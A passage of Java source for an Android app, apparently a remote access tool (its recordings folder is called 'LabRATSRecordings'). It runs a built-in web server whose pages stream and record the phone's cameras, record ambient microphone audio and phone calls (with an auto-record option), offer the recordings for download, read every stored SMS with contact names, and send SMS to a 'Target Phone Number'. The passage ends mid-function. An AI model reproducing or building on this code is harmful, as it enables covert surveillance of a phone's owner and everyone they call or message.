                "<button onclick=\"rotateStream()\" style=\"padding: 12px 24px; background: rgba(243, 156, 18, 0.2); border: 1px solid #f39c12; border-radius: 10px; color: #f39c12; font-weight: 600; cursor: pointer;\">&#8635; Rotate 90&deg;</button>");
        html.append(
                "<button onclick=\"capturePhoto()\" style=\"padding: 12px 24px; background: linear-gradient(135deg, #3498db, #2980b9); border: none; border-radius: 10px; color: #fff; font-weight: 600; cursor: pointer;\">&#128247; Capture Photo</button>");
        html.append(
                "<button id=\"rec-btn\" onclick=\"toggleRecording()\" style=\"padding: 12px 24px; background: linear-gradient(135deg, #e74c3c, #c0392b); border: none; border-radius: 10px; color: #fff; font-weight: 600; cursor: pointer;\">&#9679; Start Recording</button>");
        html.append(
                "<a href=\"/camera\" style=\"padding: 12px 24px; background: rgba(255,255,255,0.1); border-radius: 10px; color: #fff; text-decoration: none;\">&#8592; Back</a>");
        html.append("</div>");

        // Status
        html.append(
                "<div id=\"status\" style=\"text-align: center; margin-top: 20px; color: #888; font-size: 0.9rem;\"></div>");

        // JavaScript for live stream with optimizations
        html.append("<script>");
        html.append("var camId = '").append(camId).append("';");
        html.append("var streamWidth = ").append(width).append(";");
        html.append("var streamHeight = ").append(height).append(";");
        html.append("var streamQuality = ").append(quality).append(";");
        html.append("var refreshRate = ").append(refreshRate).append(";");
        html.append("var isRecording = false;");
        html.append("var streamImg = document.getElementById('stream');");
        html.append("var loadingDiv = document.getElementById('loading');");
        html.append("var fpsCounter = document.getElementById('fps-counter');");
        html.append("var frameCount = 0;");
        html.append("var lastFpsTime = Date.now();");
        html.append("var errorCount = 0;");
        html.append("var streamActive = true;");
        html.append("var currentRotation = 0;");

        // Rotate stream function
        html.append("function rotateStream() {");
        html.append("  currentRotation = (currentRotation + 90) % 360;");
        html.append("  streamImg.style.transform = 'rotate(' + currentRotation + 'deg)';");
        html.append("}");

        html.append("function triggerFlash() {");
        html.append("  fetch('/camera/flash').then(r => r.json()).then(d => {");
        html.append("    document.getElementById('status').innerHTML = d.message;");
        html.append("    setTimeout(() => { document.getElementById('status').innerHTML = ''; }, 3000);");
        html.append("  });");
        html.append("}");

        // Start streaming with current resolution
        html.append("function startStream() {");
        html.append(
                "  fetch('/camera/start-stream?cam=' + camId + '&width=' + streamWidth + '&height=' + streamHeight + '&quality=' + streamQuality);");
        html.append("  setTimeout(refreshFrame, 1000);");
        html.append("}");

        // Handle stream load success
        html.append("function streamLoaded() {");
        html.append("  loadingDiv.style.display = 'none';");
        html.append("  errorCount = 0;");
        html.append("  frameCount++;");
        html.append("  var now = Date.now();");
        html.append("  if (now - lastFpsTime >= 1000) {");
        html.append("    fpsCounter.innerHTML = frameCount + ' fps';");
        html.append("    frameCount = 0;");
        html.append("    lastFpsTime = now;");
        html.append("  }");
        html.append("}");

        // Handle stream error with retry
        html.append("function handleStreamError() {");
        html.append("  errorCount++;");
        html.append("  if (errorCount < 10) {");
        html.append("    setTimeout(function() { streamImg.src = '/camera/frame?t=' + Date.now(); }, 500);");
        html.append("  } else {");
        html.append(
                "    loadingDiv.innerHTML = 'Stream error. <a href=\"javascript:location.reload()\" style=\"color:#e94560\">Reload</a>';");
        html.append("  }");
        html.append("}");

        // Refresh frame with adaptive timing
        html.append("function refreshFrame() {");
        html.append("  if (!streamActive) return;");
        html.append("  streamImg.src = '/camera/frame?t=' + Date.now();");
        html.append("  setTimeout(refreshFrame, refreshRate);");
        html.append("}");

        // Capture photo
        html.append("function capturePhoto() {");
        html.append("  window.open('/camera/photo?cam=' + camId, '_blank');");
        html.append("}");

        // Toggle recording
        html.append("function toggleRecording() {");
        html.append("  var btn = document.getElementById('rec-btn');");
        html.append("  var indicator = document.getElementById('rec-indicator');");
        html.append("  if (isRecording) {");
        html.append("    fetch('/camera/stop-record').then(r => r.json()).then(d => {");
        html.append("      document.getElementById('status').innerHTML = d.message;");
        html.append("      btn.innerHTML = '&#9679; Start Recording';");
        html.append("      btn.style.background = 'linear-gradient(135deg, #e74c3c, #c0392b)';");
        html.append("      indicator.style.display = 'none';");
        html.append("      isRecording = false;");
        html.append("    });");
        html.append("  } else {");
        html.append("    fetch('/camera/record?cam=' + camId).then(r => r.json()).then(d => {");
        html.append("      document.getElementById('status').innerHTML = d.message;");
        html.append("      btn.innerHTML = '&#9632; Stop Recording';");
        html.append("      btn.style.background = 'linear-gradient(135deg, #27ae60, #2ecc71)';");
        html.append("      indicator.style.display = 'block';");
        html.append("      isRecording = true;");
        html.append("    });");
        html.append("  }");
        html.append("}");

        // Check status
        html.append("function checkStatus() {");
        html.append("  fetch('/camera/status').then(r => r.json()).then(d => {");
        html.append("    if (d.recording) {");
        html.append("      document.getElementById('rec-indicator').style.display = 'block';");
        html.append("      document.getElementById('rec-btn').innerHTML = '&#9632; Stop Recording';");
        html.append("      isRecording = true;");
        html.append("    }");
        html.append("  }).catch(e => {});");
        html.append("}");

        // Stop stream when leaving page
        html.append("window.onbeforeunload = function() { streamActive = false; };");

        html.append("startStream();");
        html.append("checkStatus();");
        html.append("</script>");

        html.append("</div>");
        html.append(HTML_FOOTER);

        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveMJPEGStream(Map<String, String> params) {
        // Start stream if not already - use low resolution by default for mobile data
        if (!CameraService.isCurrentlyStreaming()) {
            String camId = params.get("cam");
            // Default to 320x240 with low quality for mobile data compatibility
            startCameraStreamInternal(camId != null ? camId : "0", 320, 240, 30);
            try {
                Thread.sleep(800); // Give more time for camera to start
            } catch (InterruptedException e) {
            }
        }

        // Return single frame for simplicity (MJPEG multipart is complex with
        // NanoHTTPD)
        return serveSingleFrame();
    }

    private Response serveSingleFrame() {
        byte[] frame = CameraService.getNextFrame(200);
        if (frame != null && frame.length > 0) {
            java.io.ByteArrayInputStream bis = new java.io.ByteArrayInputStream(frame);
            Response response = newFixedLengthResponse(Response.Status.OK, "image/jpeg", bis, frame.length);
            response.addHeader("Cache-Control", "no-cache, no-store, must-revalidate");
            response.addHeader("Pragma", "no-cache");
            response.addHeader("Expires", "0");
            return response;
        } else {
            // Return a 1x1 transparent pixel as fallback
            byte[] pixel = new byte[] {
                    (byte) 0xFF, (byte) 0xD8, (byte) 0xFF, (byte) 0xE0, 0x00, 0x10, 0x4A, 0x46,
                    0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00,
                    (byte) 0xFF, (byte) 0xDB, 0x00, 0x43, 0x00, 0x08, 0x06, 0x06, 0x07, 0x06,
                    0x05, 0x08, 0x07, 0x07, 0x07, 0x09, 0x09, 0x08, 0x0A, 0x0C, 0x14, 0x0D,
                    0x0C, 0x0B, 0x0B, 0x0C, 0x19, 0x12, 0x13, 0x0F, 0x14, 0x1D, 0x1A, 0x1F,
                    0x1E, 0x1D, 0x1A, 0x1C, 0x1C, 0x20, 0x24, 0x2E, 0x27, 0x20, 0x22, 0x2C,
                    0x23, 0x1C, 0x1C, 0x28, 0x37, 0x29, 0x2C, 0x30, 0x31, 0x34, 0x34, 0x34,
                    0x1F, 0x27, 0x39, 0x3D, 0x38, 0x32, 0x3C, 0x2E, 0x33, 0x34, 0x32,
                    (byte) 0xFF, (byte) 0xC0, 0x00, 0x0B, 0x08, 0x00, 0x01, 0x00, 0x01, 0x01,
                    0x01, 0x11, 0x00, (byte) 0xFF, (byte) 0xC4, 0x00, 0x1F, 0x00, 0x00, 0x01,
                    0x05, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09,
                    0x0A, 0x0B, (byte) 0xFF, (byte) 0xC4, 0x00, (byte) 0xB5, 0x10, 0x00, 0x02,
                    0x01, 0x03, 0x03, 0x02, 0x04, 0x03, 0x05, 0x05, 0x04, 0x04, 0x00, 0x00,
                    0x01, 0x7D, (byte) 0xFF, (byte) 0xDA, 0x00, 0x08, 0x01, 0x01, 0x00, 0x00,
                    0x3F, 0x00, 0x7F, (byte) 0xFF, (byte) 0xD9
            };
            java.io.ByteArrayInputStream bis = new java.io.ByteArrayInputStream(pixel);
            Response response = newFixedLengthResponse(Response.Status.OK, "image/jpeg", bis, pixel.length);
            response.addHeader("Cache-Control", "no-cache");
            return response;
        }
    }

    private Response startCameraStream(Map<String, String> params) {
        String camId = params.get("cam");
        String widthStr = params.get("width");
        String heightStr = params.get("height");
        String qualityStr = params.get("quality");

        int width = 640, height = 480, quality = 50;
        try {
            if (widthStr != null)
                width = Integer.parseInt(widthStr);
            if (heightStr != null)
                height = Integer.parseInt(heightStr);
            if (qualityStr != null)
                quality = Integer.parseInt(qualityStr);
        } catch (Exception e) {
        }

        startCameraStreamInternal(camId != null ? camId : "0", width, height, quality);

        String json = "{\"success\": true, \"message\": \"Stream started\", \"camera\": \"" +
                (camId != null ? camId : "0") + "\"}";
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    private void startCameraStreamInternal(String camId, int width, int height, int quality) {
        android.content.Intent intent = new android.content.Intent(context, CameraService.class);
        intent.setAction("START_STREAM");
        intent.putExtra("cameraId", camId);
        intent.putExtra("width", width);
        intent.putExtra("height", height);
        intent.putExtra("quality", quality);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }
    }

    private Response stopCameraStream() {
        android.content.Intent intent = new android.content.Intent(context, CameraService.class);
        intent.setAction("STOP_STREAM");
        context.startService(intent);

        String json = "{\"success\": true, \"message\": \"Stream stopped\"}";
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    private Response startVideoRecording(Map<String, String> params) {
        String camId = params.get("cam");
        String widthStr = params.get("width");
        String heightStr = params.get("height");

        int width = 1280, height = 720;
        try {
            if (widthStr != null)
                width = Integer.parseInt(widthStr);
            if (heightStr != null)
                height = Integer.parseInt(heightStr);
        } catch (Exception e) {
        }

        android.content.Intent intent = new android.content.Intent(context, CameraService.class);
        intent.setAction("START_RECORDING");
        intent.putExtra("cameraId", camId != null ? camId : "0");
        intent.putExtra("width", width);
        intent.putExtra("height", height);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }

        String json = "{\"success\": true, \"message\": \"Recording started\", \"camera\": \"" +
                (camId != null ? camId : "0") + "\"}";
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    private Response stopVideoRecording() {
        android.content.Intent intent = new android.content.Intent(context, CameraService.class);
        intent.setAction("STOP_RECORDING");
        context.startService(intent);

        String videoPath = CameraService.getCurrentVideoPath();
        String json = "{\"success\": true, \"message\": \"Recording stopped\"" +
                (videoPath != null ? ", \"path\": \"" + videoPath + "\"" : "") + "}";
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    private Response serveCameraStatus() {
        boolean streaming = CameraService.isCurrentlyStreaming();
        boolean recording = CameraService.isCurrentlyRecording();
        String currentCamera = CameraService.getCurrentCameraId();
        long duration = CameraService.getRecordingDuration();
        String videoPath = CameraService.getCurrentVideoPath();

        String json = String.format(
                "{\"streaming\": %s, \"recording\": %s, \"camera\": \"%s\", \"duration\": %d, \"videoPath\": %s}",
                streaming, recording, currentCamera, duration,
                videoPath != null ? "\"" + videoPath + "\"" : "null");
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    // ============ AUDIO/MICROPHONE RECORDING ============

    private Response serveAudioPage() {
        boolean isRecording = CallRecordService.isRecording();
        boolean isRecordingCall = CallRecordService.isRecordingCall();
        boolean isRecordingMic = CallRecordService.isRecordingMic();
        boolean callInProgress = CallRecordService.isCallInProgress();
        String callNumber = CallRecordService.getCurrentCallNumber();
        String callType = CallRecordService.getCurrentCallType();
        long duration = CallRecordService.getRecordingDuration();
        boolean autoRecordEnabled = CallRecordService.isAutoRecordEnabled();
        boolean saveOnDeviceEnabled = CallRecordService.isSaveOnDeviceEnabled();

        String html = HTML_HEADER +
                "<style>" +
                ".status-card { padding: 20px; background: rgba(255,255,255,0.05); border-radius: 15px; margin-bottom: 20px; border: 1px solid rgba(255,255,255,0.1); }"
                +
                ".status-active { border-color: #2ecc71; background: rgba(46, 204, 113, 0.1); }" +
                ".status-inactive { border-color: #e74c3c; background: rgba(231, 76, 60, 0.1); }" +
                ".status-warning { border-color: #f39c12; background: rgba(243, 156, 18, 0.1); }" +
                ".btn { padding: 12px 24px; border-radius: 10px; text-decoration: none; display: inline-block; margin: 5px; font-weight: 600; cursor: pointer; border: none; font-size: 0.9rem; }"
                +
                ".btn-primary { background: linear-gradient(135deg, #e94560, #ff6b6b); color: white; }" +
                ".btn-success { background: linear-gradient(135deg, #2ecc71, #27ae60); color: white; }" +
                ".btn-danger { background: linear-gradient(135deg, #e74c3c, #c0392b); color: white; }" +
                ".btn-warning { background: linear-gradient(135deg, #f39c12, #e67e22); color: white; }" +
                ".toggle-container { display: flex; align-items: center; gap: 10px; margin: 10px 0; }" +
                ".toggle-switch { position: relative; width: 50px; height: 26px; background: #555; border-radius: 13px; cursor: pointer; transition: all 0.3s; }"
                +
                ".toggle-switch.active { background: #2ecc71; }" +
                ".toggle-switch::after { content: ''; position: absolute; width: 22px; height: 22px; border-radius: 50%; background: white; top: 2px; left: 2px; transition: all 0.3s; }"
                +
                ".toggle-switch.active::after { left: 26px; }" +
                ".call-alert { padding: 20px; background: linear-gradient(135deg, rgba(46, 204, 113, 0.3), rgba(39, 174, 96, 0.2)); border-radius: 15px; margin-bottom: 20px; border: 2px solid #2ecc71; animation: pulse 2s infinite; }"
                +
                "@keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }" +
                ".recording-indicator { display: inline-flex; align-items: center; gap: 8px; padding: 8px 16px; background: rgba(231, 76, 60, 0.2); border-radius: 20px; color: #e74c3c; font-weight: 600; }"
                +
                ".recording-dot { width: 10px; height: 10px; background: #e74c3c; border-radius: 50%; animation: blink 1s infinite; }"
                +
                "@keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }" +
                ".duration { font-size: 1.5rem; font-weight: bold; color: #e94560; }" +
                "</style>" +
                "<div class=\"card\">" +
                "<h2 style=\"margin-bottom: 20px;\">&#127908; Audio Control Panel</h2>";

        // Call in progress alert
        if (callInProgress) {
            html += "<div class=\"call-alert\">" +
                    "<div style=\"display: flex; align-items: center; gap: 15px;\">" +
                    "<span style=\"font-size: 2rem;\">&#128222;</span>" +
                    "<div>" +
                    "<div style=\"font-size: 1.2rem; font-weight: bold; color: #2ecc71;\">" +
                    (callType.equals("incoming") ? "Incoming Call" : "Outgoing Call") + "</div>" +
                    "<div style=\"color: #fff;\">" + escapeHtml(callNumber) + "</div>" +
                    "</div>" +
                    "</div>" +
                    "</div>";
        }

        // Recording status
        html += "<div class=\"status-card " + (isRecording ? "status-active" : "status-inactive") + "\">" +
                "<div style=\"display: flex; justify-content: space-between; align-items: center;\">" +
                "<div>" +
                "<h3>" + (isRecording ? "&#128308; Recording Active" : "&#9899; Not Recording") + "</h3>";

        if (isRecording) {
            String recordingType = isRecordingCall ? "Call Recording" : "Microphone Recording";
            html += "<p style=\"color: #888; margin-top: 5px;\">" + recordingType + "</p>" +
                    "<div class=\"duration\" id=\"duration\">" + formatDuration((int) duration) + "</div>";
        }

        html += "</div>" +
                "<div>" +
                (isRecording
                        ? "<a href=\"/audio/" + (isRecordingCall ? "call" : "mic")
                                + "/stop\" class=\"btn btn-danger\">&#9724; Stop</a>"
                        : "")
                +
                "</div>" +
                "</div>" +
                "</div>";

        // Control buttons
        html += "<div class=\"card\">" +
                "<h3 style=\"margin-bottom: 15px;\">&#127897; Microphone Recording</h3>" +
                "<p style=\"color: #888; margin-bottom: 15px;\">Capture ambient audio from device microphone</p>" +
                "<div>" +
                "<a href=\"/audio/mic/start\" class=\"btn btn-success\" "
                + (isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "") + ">&#128308; Start Recording</a>" +
                "<a href=\"/audio/mic/start?duration=30\" class=\"btn btn-warning\" "
                + (isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "") + ">Record 30s</a>" +
                "<a href=\"/audio/mic/start?duration=60\" class=\"btn btn-warning\" "
                + (isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "") + ">Record 1min</a>" +
                "<a href=\"/audio/mic/start?duration=300\" class=\"btn btn-warning\" "
                + (isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "") + ">Record 5min</a>" +
                "</div>" +
                "</div>";

        // Call recording section
        html += "<div class=\"card\">" +
                "<h3 style=\"margin-bottom: 15px;\">&#128222; Call Recording</h3>" +
                "<p style=\"color: #888; margin-bottom: 15px;\">Record phone calls automatically or manually</p>" +
                "<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px;\">"
                +
                "<div class=\"toggle-container\">" +
                "<span>Auto-record calls:</span>" +
                "<a href=\"/audio/settings?auto_record=" + (!autoRecordEnabled) + "&save_on_device="
                + saveOnDeviceEnabled + "\" style=\"text-decoration: none;\">" +
                "<div class=\"toggle-switch " + (autoRecordEnabled ? "active" : "") + "\"></div>" +
                "</a>" +
                "</div>" +
                "<div class=\"toggle-container\">" +
                "<span>Save on device:</span>" +
                "<a href=\"/audio/settings?auto_record=" + autoRecordEnabled + "&save_on_device="
                + (!saveOnDeviceEnabled) + "\" style=\"text-decoration: none;\">" +
                "<div class=\"toggle-switch " + (saveOnDeviceEnabled ? "active" : "") + "\"></div>" +
                "</a>" +
                "</div>" +
                "</div>" +
                "</div>";

        // View recordings link
        html += "<div class=\"card\">" +
                "<h3 style=\"margin-bottom: 15px;\">&#128190; Saved Recordings</h3>" +
                "<a href=\"/audio/recordings\" class=\"btn btn-primary\">View All Recordings</a>" +
                "<a href=\"/files/Music/LabRATSRecordings\" class=\"btn btn-success\">Open in File Manager</a>" +
                "</div>";

        // Auto-refresh script for status
        html += "<script>" +
                "setInterval(function() {" +
                "  fetch('/audio/status')" +
                "    .then(r => r.json())" +
                "    .then(data => {" +
                "      if (data.isRecording && document.getElementById('duration')) {" +
                "        var d = data.duration;" +
                "        var min = Math.floor(d / 60);" +
                "        var sec = d % 60;" +
                "        document.getElementById('duration').textContent = min + ':' + (sec < 10 ? '0' : '') + sec;" +
                "      }" +
                "      if (data.callInProgress && !document.querySelector('.call-alert')) {" +
                "        location.reload();" +
                "      }" +
                "    });" +
                "}, 2000);" +
                "</script>";

        html += HTML_FOOTER;
        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }

    private Response startMicRecording(Map<String, String> params) {
        int duration = 0;
        if (params.containsKey("duration")) {
            try {
                duration = Integer.parseInt(params.get("duration"));
            } catch (Exception e) {
                duration = 0;
            }
        }

        android.content.Intent intent = new android.content.Intent(context, CallRecordService.class);
        intent.setAction("START_MIC_RECORDING");
        intent.putExtra("duration", duration);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }

        // Redirect back to audio page
        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"1;url=/audio\"></head>" +
                "<body style=\"background:#1a1a2e;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;\">"
                +
                "<h2>&#127897; Starting microphone recording...</h2></body></html>";
        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }

    private Response stopMicRecording() {
        android.content.Intent intent = new android.content.Intent(context, CallRecordService.class);
        intent.setAction("STOP_MIC_RECORDING");
        context.startService(intent);

        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"1;url=/audio\"></head>" +
                "<body style=\"background:#1a1a2e;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;\">"
                +
                "<h2>&#9724; Stopping microphone recording...</h2></body></html>";
        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }

    private Response startCallRecording(Map<String, String> params) {
        String phoneNumber = params.get("number");
        String callType = params.get("type");

        android.content.Intent intent = new android.content.Intent(context, CallRecordService.class);
        intent.setAction("START_CALL_RECORDING");
        intent.putExtra("phone_number", phoneNumber != null ? phoneNumber : "manual");
        intent.putExtra("call_type", callType != null ? callType : "manual");

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }

        String json = "{\"success\": true, \"message\": \"Call recording started\"}";
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    private Response stopCallRecording() {
        android.content.Intent intent = new android.content.Intent(context, CallRecordService.class);
        intent.setAction("STOP_CALL_RECORDING");
        context.startService(intent);

        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"1;url=/audio\"></head>" +
                "<body style=\"background:#1a1a2e;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;\">"
                +
                "<h2>&#9724; Stopping call recording...</h2></body></html>";
        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }

    private Response serveAudioStatus() {
        boolean isRecording = CallRecordService.isRecording();
        boolean isRecordingCall = CallRecordService.isRecordingCall();
        boolean isRecordingMic = CallRecordService.isRecordingMic();
        boolean callInProgress = CallRecordService.isCallInProgress();
        String callNumber = CallRecordService.getCurrentCallNumber();
        String callType = CallRecordService.getCurrentCallType();
        long duration = CallRecordService.getRecordingDuration();
        String recordingPath = CallRecordService.getCurrentRecordingPath();
        boolean autoRecordEnabled = CallRecordService.isAutoRecordEnabled();
        boolean saveOnDeviceEnabled = CallRecordService.isSaveOnDeviceEnabled();

        String json = String.format(
                "{\"isRecording\": %s, \"isRecordingCall\": %s, \"isRecordingMic\": %s, " +
                        "\"callInProgress\": %s, \"callNumber\": \"%s\", \"callType\": \"%s\", " +
                        "\"duration\": %d, \"recordingPath\": %s, " +
                        "\"autoRecordEnabled\": %s, \"saveOnDeviceEnabled\": %s}",
                isRecording, isRecordingCall, isRecordingMic,
                callInProgress, escapeHtml(callNumber != null ? callNumber : ""), callType != null ? callType : "",
                duration, recordingPath != null ? "\"" + recordingPath + "\"" : "null",
                autoRecordEnabled, saveOnDeviceEnabled);
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    private Response updateAudioSettings(Map<String, String> params) {
        boolean autoRecord = "true".equalsIgnoreCase(params.get("auto_record"));
        boolean saveOnDevice = "true".equalsIgnoreCase(params.get("save_on_device"));

        android.content.Intent intent = new android.content.Intent(context, CallRecordService.class);
        intent.setAction("UPDATE_SETTINGS");
        intent.putExtra("auto_record", autoRecord);
        intent.putExtra("save_on_device", saveOnDevice);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }

        // Redirect back to audio page
        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"0;url=/audio\"></head>" +
                "<body></body></html>";
        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }

    private Response serveAudioRecordings() {
        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">&#128190; Audio Recordings</h2>");

        // Get recordings directory
        File recordDir = new File(Environment.getExternalStoragePublicDirectory(
                Environment.DIRECTORY_MUSIC), "LabRATSRecordings");

        if (!recordDir.exists() || !recordDir.isDirectory()) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#127897;</div><p>No recordings yet</p></div>");
        } else {
            File[] files = recordDir.listFiles(
                    (dir, name) -> name.toLowerCase().endsWith(".m4a") || name.toLowerCase().endsWith(".mp3") ||
                            name.toLowerCase().endsWith(".wav") || name.toLowerCase().endsWith(".aac"));

            if (files == null || files.length == 0) {
                html.append(
                        "<div class=\"empty-state\"><div class=\"icon\">&#127897;</div><p>No recordings yet</p></div>");
            } else {
                // Sort by date (newest first)
                java.util.Arrays.sort(files, (a, b) -> Long.compare(b.lastModified(), a.lastModified()));

                html.append("<ul class=\"file-list\">");

                int count = 0;
                for (File file : files) {
                    if (count >= 50)
                        break; // Limit to 50 files

                    String fileName = file.getName();
                    String icon = "&#127897;";
                    String iconClass = "file-icon-audio";

                    // Determine recording type from filename
                    String recordType = "Unknown";
                    if (fileName.startsWith("CALL_incoming")) {
                        icon = "&#128222;";
                        recordType = "Incoming Call";
                    } else if (fileName.startsWith("CALL_outgoing")) {
                        icon = "&#128222;";
                        recordType = "Outgoing Call";
                    } else if (fileName.startsWith("MIC_")) {
                        icon = "&#127897;";
                        recordType = "Microphone";
                    }

                    html.append("<li class=\"file-item\">");
                    html.append("<div class=\"file-icon ").append(iconClass).append("\">").append(icon)
                            .append("</div>");
                    html.append("<div class=\"file-info\">");
                    html.append("<span class=\"file-name\">").append(escapeHtml(fileName)).append("</span>");
                    html.append("<div class=\"file-meta\">");
                    html.append(recordType).append(" - ");
                    html.append(formatFileSize(file.length())).append(" - ");
                    html.append(new SimpleDateFormat("MMM dd, yyyy HH:mm", Locale.getDefault())
                            .format(new Date(file.lastModified())));
                    html.append("</div></div>");
                    html.append("<a href=\"/download/Music/LabRATSRecordings/").append(fileName)
                            .append("\" style=\"padding: 8px 16px; background: rgba(233, 69, 96, 0.2); border-radius: 8px; color: #e94560; text-decoration: none; font-size: 0.85rem;\">Download</a>");
                    html.append("</li>");

                    count++;
                }

                html.append("</ul>");
            }
        }

        html.append("<div style=\"margin-top: 20px;\">");
        html.append(
                "<a href=\"/audio\" style=\"color: #e94560; text-decoration: none;\">&larr; Back to Audio Control</a>");
        html.append("</div>");
        html.append("</div>");
        html.append(HTML_FOOTER);

        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveSmsMessages(Map<String, String> params) {
        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">&#128233; SMS Terminal</h2>");
        html.append("<div style=\"background: rgba(0, 242, 255, 0.05); padding: 20px; border: 1px solid var(--neon-cyan); border-radius: 8px; margin-bottom: 30px;\">");
        html.append("<h3 style=\"font-size: 1rem; margin-bottom: 15px;\">&#128231; Send New Message</h3>");
        html.append("<form action=\"/sms/send\" method=\"get\">");
        html.append("<div style=\"display: flex; flex-direction: column; gap: 10px;\">");
        html.append("<input type=\"text\" name=\"number\" placeholder=\"Target Phone Number\" style=\"background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 4px; font-family: 'JetBrains Mono', monospace;\">");
        html.append("<textarea name=\"message\" placeholder=\"Message Content\" rows=\"3\" style=\"background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 4px; font-family: 'JetBrains Mono', monospace;\"></textarea>");
        html.append("<button type=\"submit\" style=\"align-self: flex-start;\">ENCRYPT & SEND</button>");
        html.append("</div></form></div>");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div><p>SMS permission not granted.</p></div></div>").append(HTML_FOOTER);
                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
            }
        }
        int page = 1; int limit = 50;
        try { if (params.containsKey("page")) page = Integer.parseInt(params.get("page")); } catch (Exception e) {}
        int offset = (page - 1) * limit;
        Cursor cursor = null;
        try {
            Uri smsUri = Uri.parse("content://sms/");
            cursor = context.getContentResolver().query(smsUri, new String[]{"_id", "address", "body", "date", "type"}, null, null, "date DESC");
            if (cursor != null && cursor.getCount() > 0) {
                int totalCount = cursor.getCount();
                int totalPages = (int) Math.ceil((double) totalCount / limit);
                html.append("<p style=\"color: #888; margin-bottom: 15px;\">Total: ").append(totalCount).append(" messages | Page ").append(page).append(" of ").append(totalPages).append("</p>");
                html.append("<div style=\"overflow-x: auto;\"><table><thead><tr><th>Type</th><th>Address</th><th>Message</th><th>Date</th></tr></thead><tbody>");
                int count = 0, skipped = 0;
                Map<String, String> contactCache = new HashMap<>();
                while (cursor.moveToNext()) {
                    if (skipped < offset) { skipped++; continue; }
                    if (count >= limit) break;
                    String address = cursor.getString(1), body = cursor.getString(2);
                    long date = cursor.getLong(3); int type = cursor.getInt(4);
                    String typeLabel = (type == 1) ? "INBOX" : "SENT", typeClass = (type == 1) ? "call-incoming" : "call-outgoing";
                    String displayName = getContactName(address, contactCache);
                    html.append("<tr><td class=\"").append(typeClass).append("\">").append(typeLabel).append("</td>");
                    html.append("<td>").append(escapeHtml(displayName)).append("</td>");
                    html.append("<td style=\"max-width: 400px; word-wrap: break-word;\">").append(body != null ? escapeHtml(body) : "").append("</td>");
                    html.append("<td>").append(formatMessageDate(date)).append("</td></tr>");
                    count++;
                }
                html.append("</tbody></table></div>");
                if (totalPages > 1) {
                    html.append("<div class=\"pagination\" style=\"flex-direction: column; gap: 15px;\">");
                    
                    html.append("<div style=\"display: flex; gap: 5px; justify-content: center; flex-wrap: wrap;\">");
                    if (page > 1) {
                        html.append("<a href=\"/sms?page=1\">First</a>");
                        html.append("<a href=\"/sms?page=").append(page - 1).append("\">&#8592; Prev</a>");
                    }

                    int startPage = Math.max(1, page - 2);
                    int endPage = Math.min(totalPages, page + 2);
                    for (int i = startPage; i <= endPage; i++) {
                        String active = (i == page) ? "class=\"active\"" : "";
                        html.append("<a ").append(active).append(" href=\"/sms?page=").append(i).append("\">").append(i).append("</a>");
                    }

                    if (page < totalPages) {
                        html.append("<a href=\"/sms?page=").append(page + 1).append("\">Next &#8594;</a>");
                        html.append("<a href=\"/sms?page=").append(totalPages).append("\">Last</a>");
                    }
                    html.append("</div>");

                    // Jump to page box
